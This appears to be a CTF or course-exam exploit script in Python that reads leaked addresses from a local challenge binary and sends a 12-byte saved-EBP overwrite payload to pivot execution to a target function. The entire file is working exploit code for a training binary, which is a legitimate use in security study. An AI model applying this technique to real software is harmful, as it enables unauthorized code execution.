#!/usr/bin/env python3
"""Exam-ready helper for a classic frame-pointer pivot.

Default use:
    ./exploit.py

What it expects:
- a 32-bit stack frame with an 8-byte local buffer
- a 12-byte read that reaches the saved EBP, but not the return address
- a leak of one code address and one stack buffer address

What it does:
- reads the banner until both leaks are visible
- builds [fake_EBP][target_addr][buffer_addr]
- sends the payload through a real PTY so stdin buffering stays predictable

If the exam version changes the leaked names, this script still works as long
as the banner contains one code address and one stack address.
"""

from __future__ import annotations

import argparse
import os
import pty
import re
import struct
import sys
import termios
import select
import time

DEFAULT_BINARY = "./challenge"
FAKE_EBP = 0x41414141
HEX_ADDR_RE = re.compile(r"0x([0-9a-fA-F]{7,8})")


def is_code_addr(value: int) -> bool:
    return 0x08000000 <= value < 0x09000000


def is_stack_addr(value: int) -> bool:
    return 0xFF000000 <= value <= 0xFFFFFFFF


def extract_addresses(line: str) -> list[int]:
    return [int(match.group(1), 16) for match in HEX_ADDR_RE.finditer(line)]


def parse_banner(text: str) -> tuple[int, int]:
    """Return the leaked code address and buffer address.

    The parser prefers lines that look like the original challenge output, but
    it falls back to raw address classification if the labels change.
    """

    code_addr: int | None = None
    buffer_addr: int | None = None

    for line in text.splitlines():
        values = extract_addresses(line)
        if not values:
            continue

        lower = line.lower()
        code_hint = any(
            keyword in lower
            for keyword in ("jump", "code", "text", "func", "win", "target")
        )
        stack_hint = any(
            keyword in lower for keyword in ("buf", "stack", "frame", "ebp", "saved")
        )

        for value in values:
            if (
                code_addr is None
                and is_code_addr(value)
                and (code_hint or not stack_hint)
            ):
                code_addr = value
            if (
                buffer_addr is None
                and is_stack_addr(value)
                and (stack_hint or not code_hint)
            ):
                buffer_addr = value

        if code_addr is not None and buffer_addr is not None:
            return code_addr, buffer_addr

    for line in text.splitlines():
        for value in extract_addresses(line):
            if code_addr is None and is_code_addr(value):
                code_addr = value
            elif buffer_addr is None and is_stack_addr(value):
                buffer_addr = value

        if code_addr is not None and buffer_addr is not None:
            return code_addr, buffer_addr

    raise RuntimeError("Failed to parse both leaked addresses")


def read_until_leaks(fd: int, timeout: float = 2.0) -> bytes:
    data = b""
    start = time.time()
    while time.time() - start < timeout:
        ready, _, _ = select.select([fd], [], [], 0.1)
        if not ready:
            continue
        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        data += chunk
        try:
            parse_banner(data.decode("latin1", errors="ignore"))
            return data
        except RuntimeError:
            continue
    raise RuntimeError("Timed out waiting for leaked addresses")


def read_rest(fd: int, timeout: float = 1.0) -> bytes:
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        ready, _, _ = select.select([fd], [], [], 0.1)
        if not ready:
            continue
        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    return out


def build_payload(target_addr: int, buffer_addr: int) -> bytes:
    return (
        struct.pack("<I", FAKE_EBP)
        + struct.pack("<I", target_addr)
        + struct.pack("<I", buffer_addr)
    )


def launch_with_pty(binary: str) -> tuple[int, int]:
    master_fd, slave_fd = pty.openpty()
    attrs = termios.tcgetattr(slave_fd)
    attrs[3] &= ~(termios.ECHO | termios.ICANON)
    termios.tcsetattr(slave_fd, termios.TCSANOW, attrs)

    pid = os.fork()
    if pid == 0:
        os.setsid()
        os.dup2(slave_fd, 0)
        os.dup2(slave_fd, 1)
        os.dup2(slave_fd, 2)
        os.close(master_fd)
        os.close(slave_fd)
        os.execv(binary, [binary])

    os.close(slave_fd)
    return pid, master_fd


def main() -> None:
    parser = argparse.ArgumentParser(description="Frame-pointer pivot helper")
    parser.add_argument(
        "--binary",
        default=DEFAULT_BINARY,
        help="path to the local challenge binary (default: ./challenge)",
    )
    parser.add_argument(
        "--mode",
        choices=["local", "remote"],
        default="local",
        help="mode (local only for this exploit, default: local)",
    )
    args = parser.parse_args()

    pid, master_fd = launch_with_pty(args.binary)

    try:
        banner = read_until_leaks(master_fd)
        text = banner.decode("latin1", errors="ignore")
        sys.stdout.write(text)

        target_addr, buffer_addr = parse_banner(text)
        payload = build_payload(target_addr, buffer_addr)

        print("[step] target     = 0x%08x" % target_addr)
        print("[step] buffer     = 0x%08x" % buffer_addr)
        print("[step] fake EBP   = 0x%08x" % FAKE_EBP)
        print("[step] payload    = [fake_EBP][target][buffer]")
        print("[step] payload len = %d bytes" % len(payload))

        os.write(master_fd, payload)
        out = read_rest(master_fd)
        sys.stdout.write(out.decode("latin1", errors="ignore"))
    finally:
        try:
            _, status = os.waitpid(pid, os.WNOHANG)
            if status == 0:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
        except OSError:
            pass

        os.close(master_fd)


if __name__ == "__main__":
    main()
